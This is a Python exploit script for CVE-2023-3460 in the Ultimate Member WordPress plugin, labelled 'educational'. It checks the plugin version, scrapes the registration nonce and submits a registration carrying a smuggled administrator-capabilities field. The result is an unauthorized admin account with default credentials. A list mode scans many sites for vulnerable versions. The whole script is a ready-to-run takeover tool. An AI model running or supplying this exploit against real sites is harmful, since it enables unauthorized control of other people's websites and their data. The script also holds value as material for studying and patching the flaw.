#CVE-2023-3460
#unauthorized admin access for Ultimate Member plugin
#made by Diego Tellaroli 
#made for educacional purposes only
import requests
import argparse
import re

def checkVersion(target):
    print("[+] Checking if target is vulnerable...")
    targetVersion = target + "/wp-content/plugins/ultimate-member/readme.txt"
    try:
        r = requests.get(targetVersion)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        print("[!] Error! Could not find the version...")
        exit()

    version2 = version.replace('.', '')
    if int(version2) < 277:
    	print("[!] version found: "+version+" - Target vulnerable!")
    else:
        print("[!] version found: "+version+" - Target is not vulnerable!")
        exit()
    
def getNonce(target):
    print("[+] Getting nonce...")
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
    }
    try:
        r = requests.get(target, headers=headers, verify=False)
        nonce = re.search(r"name=\"_wpnonce\" value=\"(.{10})\"", r.text).groups()[0]
        print("[!] Nonce found: "+nonce)
        return nonce
    except:
    	print("Error! Could not get the nonce")
    	exit()

def addUser(form_id, nonce, target, username, email, password):
    print("[+] Adding a new administrator...")
    data = {
       f'user_login-{form_id}' : username,
        f'user_email-{form_id}': email,
        f'user_password-{form_id}': password,
        f'confirm_user_password-{form_id}': password,
        f'first_name-{form_id}': 'Admin',
        f'last_name-{form_id}': '0xgordo',
        'form_id': form_id,
        'um_request': '',
        '_wpnonce': nonce,
        'wp_cÃ pabilities[administrator]': 1
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'
    }
    r = requests.post(f'{target}/index.php/register/', data=data, headers=headers, verify=False, allow_redirects=False)
    if r.status_code == 302:
        print("[!] User added! ")
        print("[+] username: "+username)
        print("[+] email: "+email)
        print("[+] password: "+password)
    else:
        print(r.status_code)
        print("[!] Error! Try with a different user")

def exploitList(lista):
    f = open(lista, 'r')
    for i in f.readlines():
        url = i.rstrip('\n')
        checkVersionList(url)
    
def checkVersionList(target):
    targetVersion = target + "/wp-content/plugins/ultimate-member/readme.txt"
    try:
        r = requests.get(targetVersion)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except:
        print("[!] Could not get version of "+target)
        return

    version2 = version.replace('.', '')
    if int(version2) < 277:
    	print("[!] version found: "+version+" - "+target+" vulnerable!")
    else:
    	print("[!] version found: "+version+" - "+target+" is not vulnerable!")
    
parser = argparse.ArgumentParser(description='Exploit for CVE-2023-3460 for Ultimate Member - Wordpress.')
required = parser.add_mutually_exclusive_group(required=True)
required.add_argument('-t', '--target', type=str, help='Target IP or domain', required=False)
parser.add_argument('-n', '--nonce', type=str, help='Nonce', required=False)
parser.add_argument('-u', '--user', type=str, help='User to be added', required=False, default='gordo')
parser.add_argument('-p', '--password', type=str, help='Password to be added', required=False, default='HackingAnotherWebsite15')
parser.add_argument('-e', '--email', type=str, help='Email to be added', required=False, default='hacked@gmail.com')
parser.add_argument('-l', '--list', type=str, help='List of targets to search', required=False)
required.add_argument('-c', '--check', action='store_true', help='Only check if it is vulnerable')
parser.add_argument('-i', '--id', type=int, help='Form ID (default 6)', default=6)

args = parser.parse_args()
stopScan = args.check
lista = args.list
target = args.target
form_id = args.id

print("--- Exploit and scan for CVE-2023-3460 | Made by Diego Tellaroli | https://github.com/diego-tella ---")

if stopScan and lista:
    exploitList(lista)
elif stopScan and not lista:
    print("[!] Error! You need to pass a list!")
else:
    checkVersion(target)
    nonce = getNonce(target+"/index.php/register") #only if this is the register URL (it may be another one)
    addUser(form_id, nonce, target, args.user, args.email, args.password)

